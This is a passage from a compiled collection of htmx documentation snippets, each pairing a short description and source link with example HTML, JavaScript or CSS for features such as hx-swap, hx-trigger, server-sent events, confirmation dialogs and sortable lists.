https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_13\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-get=\"/clicked\" hx-trigger=\"click[ctrlKey]\">\n    Control Click Me\n</div>\n```\n\n----------------------------------------\n\nTITLE: Disabling Button with hx-disabled-elt - HTML\nDESCRIPTION: This example shows how to use the hx-disabled-elt attribute to disable a button element itself during an htmx POST request. When the button is clicked, it will be disabled until the request completes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-disabled-elt.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button hx-post=\"/example\" hx-disabled-elt=\"this\">\n    Post It!\n</button>\n```\n\n----------------------------------------\n\nTITLE: hx-disinherit affecting nested elements\nDESCRIPTION: This snippet illustrates the behavior of hx-disinherit when applied to nested elements.  The `hx-select` attribute is not inherited by the button because the direct parent `div` has `hx-disinherit=\"hx-select\"`, even though the grandparent defines the `hx-select` attribute.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-disinherit.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-select=\"#content\">\n  <div hx-boost=\"true\" hx-target=\"#content\" hx-disinherit=\"hx-select\">\n    <!-- hx-target is automatically inherited from parent's value -->\n    <!-- hx-select is not inherited, because the direct parent does\n    disables inheritance, despite not specifying hx-select itself -->\n    <button hx-get=\"/test\"></button>\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Trigger htmx request with onClick and custom event (SweetAlert2)\nDESCRIPTION: This snippet demonstrates triggering an htmx request based on the user's confirmation in a SweetAlert2 dialog. The button's onClick event displays the SweetAlert2 confirmation, and if confirmed, it triggers a custom 'confirmed' event using htmx.trigger. This custom event is then used as the trigger for the hx-get request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/confirm.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://cdn.jsdelivr.net/npm/sweetalert2@11\"></script>\n<button hx-get=\"/confirmed\" \n        hx-trigger='confirmed'\n        onClick=\"Swal.fire({title: 'Confirm', text:'Do you want to continue?'}).then((result)=>{\n            if(result.isConfirmed){\n              htmx.trigger(this, 'confirmed');  \n            } \n        })\">\n  Click Me\n</button>\n```\n\n----------------------------------------\n\nTITLE: hx-swap with focus-scroll:true\nDESCRIPTION: This example shows how to enable focus scrolling for a specific input element using `hx-swap=\"outerHTML focus-scroll:true\"`. When the input receives focus, the page will scroll to make it visible.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n  <input id=\"name\" hx-get=\"/validation\" \n       hx-swap=\"outerHTML focus-scroll:true\"/>\n```\n\n----------------------------------------\n\nTITLE: Sending Post Request with hx-post\nDESCRIPTION: This snippet shows how to send a POST request to a URL using htmx's `hx-post`. Sends a POST request to the given URL. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_11\n\nLANGUAGE: html\nCODE:\n```\nhx-post\n```\n\n----------------------------------------\n\nTITLE: htmx PUT Request Example\nDESCRIPTION: This example demonstrates how to use the `hx-put` attribute to issue a PUT request to a specified URL. When the button is clicked, a PUT request is sent to `/messages`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_9\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-put=\"/messages\">\n    Put To Messages\n</button>\n```\n\n----------------------------------------\n\nTITLE: htmx POST Request with 'once' Modifier\nDESCRIPTION: This example demonstrates how to use the `once` modifier with the `hx-trigger` attribute to ensure a POST request is only issued once, even if the trigger event occurs multiple times.  The POST request is sent to `/mouse_entered` on the first mouseenter event.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_11\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-post=\"/mouse_entered\" hx-trigger=\"mouseenter once\">\n    [Here Mouse, Mouse!]\n</div>\n```\n\n----------------------------------------\n\nTITLE: Restructured Form with File Input Outside (HTML)\nDESCRIPTION: Illustrates how to restructure the HTML form to preserve file input values by moving the file input element outside the main form element. The `form` attribute is used to associate the input with the form, and the form's `hx-swap` and `hx-target` attributes are used to update the form after submission. This prevents the file input from being reset when the form's HTML is swapped.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/file-upload-input.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<input form=\"binaryForm\" type=\"file\" name=\"binaryFile\">\n\n<form method=\"POST\" id=\"binaryForm\" enctype=\"multipart/form-data\" hx-swap=\"outerHTML\" hx-target=\"#binaryForm\">\n    <button type=\"submit\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Handling Multiple Events with hx-on in HTML\nDESCRIPTION: Illustrates how to handle multiple events on a single HTML element using multiple `hx-on` attributes. This allows for separate handling of different event triggers on the same element, in this case, before and after a request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-on.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-get=\"/info\"\n        hx-on::before-request=\"alert('Making a request!')\"\n        hx-on::after-request=\"alert('Done making a request!')\">\n    Get Info!\n</button>\n```\n\n----------------------------------------\n\nTITLE: Disabling htmx Processing with hx-disable\nDESCRIPTION: This HTML snippet demonstrates the usage of the `hx-disable` attribute.  When applied to a container element, htmx will not process any htmx-related attributes or features found in that container or its children. This is useful for preventing htmx from processing untrusted content.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_55\n\nLANGUAGE: html\nCODE:\n```\n<div hx-disable>\n    <%= raw(user_content) %>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Trigger Server Callbacks - HTML\nDESCRIPTION: This snippet demonstrates how to trigger server callbacks when an SSE connection has been established. Child elements can listen for events by using the special `hx-trigger` syntax `sse:<event_name>` and use an `hx-get` or similar to trigger the element to make a request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_7\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-ext=\"sse\" sse-connect=\"/event_stream\">\n    <div hx-get=\"/chatroom\" hx-trigger=\"sse:chatter\">\n        ...\n    </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: HTMX Tab Container with JavaScript\nDESCRIPTION: This HTML snippet defines a tab container with HTMX attributes to dynamically load tab contents. It includes a JavaScript event handler to update the selected tab state when new content is loaded. The `hx-on:htmx-after-on-load` attribute triggers a JavaScript function that updates the `aria-selected` attribute and `selected` class on the tabs.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/tabs-javascript.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div id=\"tabs\" hx-target=\"#tab-contents\" role=\"tablist\"\n     hx-on:htmx-after-on-load=\"let currentTab = document.querySelector('[aria-selected=true]');\n                               currentTab.setAttribute('aria-selected', 'false')\n                               currentTab.classList.remove('selected')\n                               let newTab = event.target\n                               newTab.setAttribute('aria-selected', 'true')\n                               newTab.classList.add('selected')\">\n    <button role=\"tab\" aria-controls=\"tab-contents\" aria-selected=\"true\" hx-get=\"/tab1\" class=\"selected\">Tab 1</button>\n    <button role=\"tab\" aria-controls=\"tab-contents\" aria-selected=\"false\" hx-get=\"/tab2\">Tab 2</button>\n    <button role=\"tab\" aria-controls=\"tab-contents\" aria-selected=\"false\" hx-get=\"/tab3\">Tab 3</button>\n</div>\n\n<div id=\"tab-contents\" role=\"tabpanel\" hx-get=\"/tab1\" hx-trigger=\"load\"></div>\n```\n\n----------------------------------------\n\nTITLE: Creating Dialogs with hx-prompt and hx-confirm - HTML\nDESCRIPTION: This HTML snippet demonstrates how to create a button that triggers a prompt and a confirmation dialog using the hx-prompt and hx-confirm attributes in HTMX. The hx-post attribute specifies the URL to which the request is sent if both dialogs are accepted. The hx-target attribute updates the element with the id \"response\".\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/dialogs.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div>\n  <button class=\"btn primary\"\n          hx-post=\"/submit\"\n          hx-prompt=\"Enter a string\"\n          hx-confirm=\"Are you sure?\"\n          hx-target=\"#response\">\n    Prompt Submission\n  </button>\n  <div id=\"response\"></div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Connecting to SSE server - HTML\nDESCRIPTION: This snippet demonstrates how to connect to an SSE server using the `sse-connect` attribute. The `hx-ext=\"sse\"` attribute enables the extension, and the `sse-swap` attribute specifies the name of the message to swap into the DOM.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-ext=\"sse\" sse-connect=\"/chatroom\" sse-swap=\"message\">\n    Contents of this box will be updated in real time\n    with every SSE message received from the chatroom.\n</div>\n```\n\n----------------------------------------\n\nTITLE: htmx Indicator with Target\nDESCRIPTION: This HTML snippet demonstrates using the `hx-indicator` attribute to specify a different element to receive the `htmx-request` class. The `hx-indicator` attribute is set to '#indicator', which means the `htmx-request` class will be added to the element with `id=\"indicator\"` during the request. This allows the indicator to be separate from the trigger element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_18\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    <button hx-get=\"/click\" hx-indicator=\"#indicator\">\n        Click Me!\n    </button>\n    <img id=\"indicator\" class=\"htmx-indicator\" src=\"/spinner.gif\"/>\n</div>\n```\n\n----------------------------------------\n\nTITLE: hx-swap with settle modifier (timing)\nDESCRIPTION: This example demonstrates how to use the `settle` modifier to introduce a delay of 1 second before the settle logic is executed after the swap. This can be useful to synchronize with CSS transitions that happen after the content is swapped.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n  <!-- this will wait 1s before doing the settle after it is received -->\n  <div hx-get=\"/example\" hx-swap=\"innerHTML settle:1s\">Get Some HTML & Append It</div>\n```\n\n----------------------------------------\n\nTITLE: Using sweet alert with htmx:confirm\nDESCRIPTION: This snippet shows how to integrate SweetAlert with the `htmx:confirm` event. It checks for a `confirm-with-sweet-alert` attribute on the triggering element, prevents the default request, displays a SweetAlert confirmation dialog, and then issues the HTMX request if the user confirms. The `question` parameter is retrieved from the element's attribute. Dependencies: SweetAlert library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/events.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener('htmx:confirm', function(evt) {\n  // 1. The requirement to show the sweet alert is that the element has a confirm-with-sweet-alert\n  //    attribute on it, if it doesn't we can return early and let the default behavior happen\n  if (!evt.detail.target.hasAttribute('confirm-with-sweet-alert')) return\n\n  // 2. Get the question from the attribute\n  const question = evt.detail.target.getAttribute('confirm-with-sweet-alert');\n\n  // 3. Prevent the default behavior (this will prevent the request from being issued)\n  evt.preventDefault();\n\n  // 4. Show the sweet alert\n  swal({\n    title: \"Are you sure?\",\n    text: question || \"Are you sure you want to continue?\",\n    icon: \"warning\",\n    buttons: true,\n    dangerMode: true,\n  }).then((confirmed) => {\n    if (confirmed) {\n      // 5. If the user confirms, we can manually issue the request\n      evt.detail.issueRequest(true); // true to skip the built-in window.confirm()\n    }\n  });\n});\n```\n\n----------------------------------------\n\nTITLE: Disable History Caching with hx-history\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-history` attribute to prevent an element's state from being cached in the browser's localStorage. When the user navigates back to this page via browser history, the page will be re-requested from the server instead of being loaded from the cache.  The attribute can be placed anywhere in the document.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-history.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<html>\n<body>\n<div hx-history=\"false\">\n ...\n</div>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Out of Band Swap with hx-swap-oob - htmx\nDESCRIPTION: This HTML snippet showcases the use of out-of-band (OOB) swaps. The response from the `/contacts` endpoint includes a new `tbody` element with the `hx-swap-oob` attribute. This attribute specifies that the new `tbody` content should be appended to the `#contacts-table` element on the page.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/update-other-content.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<tbody hx-swap-oob=\"beforeend:#contacts-table\">\n  <tr>\n    <td>Joe Smith</td>\n    <td>joe@smith.com</td>\n  </tr>\n</tbody>\n\n<label>\n  Name\n      <input name=\"name\" type=\"text\">\n</label>\n<label>\n  Email\n      <input name=\"email\" type=\"email\">\n</label>\n```\n\n----------------------------------------\n\nTITLE: Configuring Response Handling with HTML Meta Tag in htmx\nDESCRIPTION: This HTML snippet demonstrates how to configure the `responseHandling` array using a meta tag.  This allows for declarative configuration of how htmx processes HTTP responses. The `content` attribute contains a JSON string that defines the response handling rules. This example shows how to define handling rules for different response codes, like 204, 2xx, 3xx, and error codes, allowing customized swapping behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_40\n\nLANGUAGE: html\nCODE:\n```\n<!--\n  * 204 No Content by default does nothing, but is not an error\n  * 2xx, 3xx and 422 responses are non-errors and are swapped\n  * 4xx & 5xx responses are not swapped and are errors\n  * all other responses are swapped using \"...\" as a catch-all\n-->\n<meta\n\tname=\"htmx-config\"\n\tcontent='{\n        \"responseHandling\":[\n            {\"code\":\"204\", \"swap\": false},\n            {\"code\":\"[23]..\", \"swap\": true},\n            {\"code\":\"422\", \"swap\": true},\n            {\"code\":\"[45]..\", \"swap\": false, \"error\":true},\n            {\"code\":\"...\", \"swap\": true}\n        ]\n    }'\n/>\n```\n\n----------------------------------------\n\nTITLE: Integrating View Transitions with htmx in HTML\nDESCRIPTION: This HTML code demonstrates how to integrate view transitions with htmx. The `hx-swap` attribute is used with the `transition:true` option to enable view transitions when swapping content.  The `sample-transition` class is applied to the div to link it to the CSS defined view transition.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/view-transitions.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n\n    <div class=\"sample-transition\">\n       <h1>Initial Content</h1>\n       <button hx-get=\"/new-content\" \n               hx-swap=\"innerHTML transition:true\" \n               hx-target=\"closest div\">\n         Swap It!\n       </button>\n    </div>\n\n```\n\n----------------------------------------\n\nTITLE: Alpine JS Integration with htmx.process()\nDESCRIPTION: This HTML and JavaScript snippet demonstrates integrating htmx with Alpine.js using Alpine's `$watch` function to observe changes in the `show_new` data property.  When `show_new` becomes true, `htmx.process()` is called on the `new_content` div to initialize the htmx attributes. This ensures that any htmx attributes inside the dynamically loaded content will be processed by htmx.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_54\n\nLANGUAGE: html\nCODE:\n```\n<div x-data=\"{show_new: false}\"\n    x-init=\"$watch('show_new', value => {\n        if (show_new) {\n            htmx.process(document.querySelector('#new_content'))\n        }\n    })\">\n    <button @click = \"show_new = !show_new\">Toggle New Content</button>\n    <template x-if=\"show_new\">\n        <div id=\"new_content\">\n            <a hx-get=\"/server/newstuff\" href=\"#\">New Clickable</a>\n        </div>\n    </template>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Using hx-on for htmx:config-request\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-on:htmx:config-request` attribute to configure a POST request before it is issued. It adds an `example` parameter to the request with the value 'Hello Scripting!'. This is useful for modifying requests dynamically based on events.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_49\n\nLANGUAGE: html\nCODE:\n```\n<button hx-post=\"/example\"\n        hx-on:htmx:config-request=\"event.detail.parameters.example = 'Hello Scripting!'\">\n    Post Me!\n</button>\n```\n\n----------------------------------------\n\nTITLE: HTML Error Response for Validation\nDESCRIPTION: This HTML snippet shows a possible server response when validation fails. It includes an error class, the input with the entered value, and an error message displayed to the user.  The hx-target and hx-swap attributes ensure that the appropriate part of the DOM is updated.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/inline-validation.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div hx-target=\"this\" hx-swap=\"outerHTML\" class=\"error\">\n  <label>Email Address</label>\n  <input name=\"email\" hx-post=\"/contact/email\" hx-indicator=\"#ind\" value=\"test@foo.com\">\n  <img id=\"ind\" src=\"/img/bars.svg\" class=\"htmx-indicator\"/>\n  <div class='error-message'>That email is already taken.  Please enter another email.</div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Adding an Event Listener in htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to add an event listener to an element using the `htmx.on()` method. It can either take the event name, listener, and optional options, or the target element, event name, listener, and optional options. The examples add a click listener to the body and a div element, and include an example of adding a listener that's only invoked once.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\n// add a click listener to the body\nvar myEventListener = htmx.on(\"click\", function(evt){ console.log(evt); });\n\n// add a click listener to the given div\nvar myEventListener = htmx.on(\"#my-div\", \"click\", function(evt){ console.log(evt); });\n\n// add a click listener to the given div that should only be invoked once\nvar myEventListener = htmx.on(\"#my-div\", \"click\", function(evt){ console.log(evt); }, { once: true });\n```\n\n----------------------------------------\n\nTITLE: Including All Parameters with hx-params in htmx (HTML)\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-params` attribute with the `*` value to include all parameters in a GET request using htmx. It shows that parameters will be URL encoded and included in the URL.  This snippet assumes the htmx library is already included in the project.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-params.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/example\" hx-params=\"*\">Get Some HTML, Including Params</div>\n```\n\n----------------------------------------\n\nTITLE: CSS Styling for Tabs\nDESCRIPTION: This CSS provides basic styling for the tab interface, including hiding the demo canvas, styling the tab buttons, and formatting the tab content area. It includes hover effects and styles for the selected tab state, using the `--midBlue` CSS variable for color consistency.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/tabs-javascript.md#_snippet_2\n\nLANGUAGE: CSS\nCODE:\n```\n<style>\n\n\t#demo-canvas {\n\t\tdisplay:none;\n\t}\n\n\t#tabs {\n\t}\n\n\t#tabs > button {\n\t\tborder: none;\n\t\tdisplay: inline-block;\n\t\tpadding: 5px 10px;\n\t\tcursor:pointer;\n\t\tbackground-color: transparent;\n\t\tborder: solid 3px rgba(0,0,0,0);\n\t\tborder-bottom: solid 3px #eee;\n\t}\n\n\t#tabs > button:hover {\n\t\tcolor: var(--midBlue);\n\t}\n\n\t#tabs > button.selected {\n\t\tborder: solid 3px var(--midBlue);\n\t}\n\n\t#tab-contents {\n\t\tpadding:10px;\n\t}\n</style>\n```\n\n----------------------------------------\n\nTITLE: Simulating Server-Side Logic - Javascript\nDESCRIPTION: This Javascript code simulates the server-side logic for handling the progress bar updates. It defines routes for initializing the demo, starting a job, getting job status, and getting job progress. It also includes template functions for generating HTML fragments dynamically and a job manager for simulating job processing.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/progress-bar.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n//=========================================================================\n// Fake Server Side Code\n//=========================================================================\n\n// routes\ninit(\"/demo\", function(request, params){\n  return startButton(\"Start Progress\");\n});\n\nonPost(\"/start\", function(request, params){\n    var job = jobManager.start();\n    return jobStatusTemplate(job);\n});\n\nonGet(\"/job\", function(request, params){\n    var job = jobManager.currentProcess();\n    return jobStatusTemplate(job);\n});\n\nonGet(\"/job/progress\", function(request, params, responseHeaders){\n    var job = jobManager.currentProcess();\n\n    if (job.complete) {\n      responseHeaders[\"HX-Trigger\"] = \"done\";\n    }\n    return jobProgressTemplate(job);\n});\n\n// templates\nfunction startButton(message) {\n  return `<div hx-target=\"this\" hx-swap=\"outerHTML\">\n  <h3>${message}</h3>\n  <button class=\"btn primary\" hx-post=\"/start\">\n            Start Job\n  </button>\n</div>`;\n}\n\nfunction jobProgressTemplate(job) {\n  return `<div class=\"progress\" role=\"progressbar\" aria-valuemin=\"0\" aria-valuemax=\"100\" aria-valuenow=\"${job.percentComplete}\" aria-labelledby=\"pblabel\">\n      <div id=\"pb\" class=\"progress-bar\" style=\"width:${job.percentComplete}%\">\n    </div>\n  </div>`\n}\n\nfunction jobStatusTemplate(job) {\n    return `<div hx-trigger=\"done\" hx-get=\"/job\" hx-swap=\"outerHTML\" hx-target=\"this\">\n  <h3 role=\"status\" id=\"pblabel\" tabindex=\"-1\" autofocus>${job.complete ? \"Complete\" : \"Running\"}</h3>\n\n  <div\n    hx-get=\"/job/progress\"\n    hx-trigger=\"${job.complete ? 'none' : 'every 600ms'}\"\n    hx-target=\"this\"\n    hx-swap=\"innerHTML\">\n    ${jobProgressTemplate(job)}\n  </div>\n  ${restartButton(job)}`;\n}\n\nfunction restartButton(job) {\n  if(job.complete){\n    return `\n<button id=\"restart-btn\" class=\"btn primary\" hx-post=\"/start\" classes=\"add show:600ms\">\n  Restart Job\n</button>`\n  } else {\n    return \"\";\n  }\n}\n\nvar jobManager = (function(){\n  var currentProcess = null;\n  return {\n    start : function() {\n      currentProcess = {\n        complete : false,\n        percentComplete : 0\n      }\n      return currentProcess;\n    },\n    currentProcess : function() {\n      currentProcess.percentComplete += Math.min(100, Math.floor(33 * Math.random()));  // simulate progress\n      currentProcess.complete = currentProcess.percentComplete >= 100;\n      return currentProcess;\n    }\n  }\n})();\n```\n\n----------------------------------------\n\nTITLE: Example HTTP Response with Set-Cookie Header (HTTP)\nDESCRIPTION: This code snippet demonstrates an HTTP response setting a cookie. It shows the basic syntax of the `Set-Cookie` header, which is crucial for maintaining user sessions and authentication. The `token` value would be used by the server to identify the user on subsequent requests.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_9\n\nLANGUAGE: HTTP\nCODE:\n```\nHTTP/2.0 200 OK\nContent-Type: text/html\nSet-Cookie: token=asd8234nsdfp982\n\n[HTML content]\n```\n\n----------------------------------------\n\nTITLE: htmx Target Attribute Example\nDESCRIPTION: This HTML snippet shows the usage of the `hx-target` attribute to specify where the response from an htmx request should be loaded. In this case, the response from the `/trigger_delay` endpoint will be loaded into the element with the ID `search-results`. The request is triggered on `keyup` with a delay of 500ms and only if the value has changed.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_19\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"text\" name=\"q\"\n    hx-get=\"/trigger_delay\"\n    hx-trigger=\"keyup delay:500ms changed\"\n    hx-target=\"#search-results\"\n    placeholder=\"Search...\">\n<div id=\"search-results\"></div>\n```\n\n----------------------------------------\n\nTITLE: Creating a Sortable List with htmx\nDESCRIPTION: This HTML code creates a sortable list using a `<form>` element with the class `.sortable` and htmx attributes. It specifies `hx-post` to send a POST request to `/items` and `hx-trigger=\"end\"` to trigger the request when the Sortable.js 'end' event is fired. Each item in the list is a `<div>` containing a hidden input with the item's ID. An htmx indicator is included to display a loading message.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/sortable.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form class=\"sortable\" hx-post=\"/items\" hx-trigger=\"end\">\n  <div class=\"htmx-indicator\">Updating...</div>\n  <div><input type='hidden' name='item' value='1'/>Item 1</div>\n  <div><input type='hidden' name='item' value='2'/>Item 2</div>\n  <div><input type='hidden' name='item' value='3'/>Item 3</div>\n  <div><input type='hidden' name='item' value='4'/>Item 4</div>\n  <div><input type='hidden' name='item' value='5'/>Item 5</div>\n</form>\n```\n\n----------------------------------------\n\nTITLE: hx-push-url Example: Pushing Fetched URL\nDESCRIPTION: This example demonstrates how to use `hx-push-url=\"true\"` to push the fetched URL from the `hx-get` attribute into the browser's location history.  When the div is triggered (e.g., by a click), htmx will make a GET request to `/account` and push that URL into the browser history.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-push-url.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/account\" hx-push-url=\"true\">\n  Go to My Account\n</div>\n```\n\n----------------------------------------\n\nTITLE: File Upload Form with Hyperscript and HTMX\nDESCRIPTION: This snippet demonstrates a file upload form using HTMX and Hyperscript. It includes a form with `multipart/form-data` encoding, a file input, a button to trigger the upload, and a progress bar. The Hyperscript code is embedded directly within the form element and listens for the `htmx:xhr:progress` event. It updates the progress bar's value based on the loaded and total bytes, using Hyperscript's event destructuring feature. Dependencies: HTMX and Hyperscript libraries.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/file-upload.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n    <form hx-encoding='multipart/form-data' hx-post='/upload'\n          _='on htmx:xhr:progress(loaded, total) set #progress.value to (loaded/total)*100'>\n        <input type='file' name='file'>\n        <button>\n            Upload\n        </button>\n        <progress id='progress' value='0' max='100'></progress>\n    </form>\n```\n\n----------------------------------------\n\nTITLE: Processing New Content with htmx.process()\nDESCRIPTION: This JavaScript snippet demonstrates using `htmx.process()` after dynamically adding content to the DOM to ensure that htmx attributes within the new content are processed. This snippet uses the `fetch` API to load HTML content from a server, then sets the inner HTML of an element with the ID 'my-div', and finally calls `htmx.process()` on that element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_53\n\nLANGUAGE: javascript\nCODE:\n```\nlet myDiv = document.getElementById('my-div')\nfetch('http://example.com/movies.json')\n    .then(response => response.text())\n    .then(data => { myDiv.innerHTML = data; htmx.process(myDiv); } );\n```\n\n----------------------------------------\n\nTITLE: htmx PATCH Request with hx-patch\nDESCRIPTION: This code snippet demonstrates the use of the hx-patch attribute in htmx to send a PATCH request to a specified URL when a button is clicked. The returned HTML is then swapped into the DOM using a swap strategy, targeting the body in this example.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-patch.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button hx-patch=\"/account\" hx-target=\"body\">\n  Patch Your Account\n</button>\n```\n\n----------------------------------------\n\nTITLE: Disabling Buttons on Form Submit with Event Listeners (JavaScript)\nDESCRIPTION: This code snippet demonstrates how to disable all buttons within a form when the form is submitted and re-enable them after the htmx content has loaded. It uses event listeners for 'submit' and 'htmx:afterOnLoad' events to toggle the 'disabled' attribute on the buttons. This avoids submitting the form's fields which are disabled.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-hotwire-turbo.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\naddEventListener(\"submit\", (event) => {\n    event.target.querySelectorAll(\"button\").forEach(node => { node.disabled = true })\n})\naddEventListener(\"htmx:afterOnLoad\", (event) => {\n    event.target.querySelectorAll(\"button\").forEach(node => { node.disabled = false })\n})\n```\n\n----------------------------------------\n\nTITLE: Indicating Loading with hx-indicator\nDESCRIPTION: This snippet shows how to indicate loading state with htmx's `hx-indicator`. It specifies an element to be shown while the request is in progress. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_7\n\nLANGUAGE: html\nCODE:\n```\nhx-indicator\n```\n\n----------------------------------------\n\nTITLE: Managing History with hx-history-elt\nDESCRIPTION: This snippet demonstrates managing history elements using htmx's `hx-history-elt`. Specifies element to be used to track history. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_8\n\nLANGUAGE: html\nCODE:\n```\nhx-history-elt\n```\n\n----------------------------------------\n\nTITLE: Adding Static Values to htmx Request with hx-vals in JSON\nDESCRIPTION: This example demonstrates how to add a static value to an htmx request using the hx-vals attribute with JSON. The 'myVal' parameter with the value 'My Value' will be included in the GET request to '/example'.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-vals.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n  <div hx-get=\"/example\" hx-vals='{\"myVal\": \"My Value\"}'>Get Some HTML, Including A Value in the Request</div>\n```\n\n----------------------------------------\n\nTITLE: Fetching Content with hx-get\nDESCRIPTION: This snippet demonstrates how to fetch content from a URL using htmx's `hx-get`.  The content retrieved will replace the element's inner HTML. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\nhx-get\n```\n\n----------------------------------------\n\nTITLE: Initializing Sortable.js with htmx\nDESCRIPTION: This JavaScript code initializes the Sortable.js library on elements with the class `.sortable` within a given content section using `htmx.onLoad`. It configures Sortable.js with options for animation, ghost class, and filtering htmx indicators. It also disables sorting on the 'end' event and re-enables it after the `htmx:afterSwap` event, using event listeners. Requires the Sortable.js library to be included.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/sortable.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.onLoad(function(content) {\n    var sortables = content.querySelectorAll(\".sortable\");\n    for (var i = 0; i < sortables.length; i++) {\n      var sortable = sortables[i];\n      var sortableInstance = new Sortable(sortable, {\n          animation: 150,\n          ghostClass: 'blue-background-class',\n\n          // Make the `.htmx-indicator` unsortable\n          filter: \".htmx-indicator\",\n          onMove: function (evt) {\n            return evt.related.className.indexOf('htmx-indicator') === -1;\n          },\n\n          // Disable sorting on the `end` event\n          onEnd: function (evt) {\n            this.option(\"disabled\", true);\n          }\n      });\n\n      // Re-enable 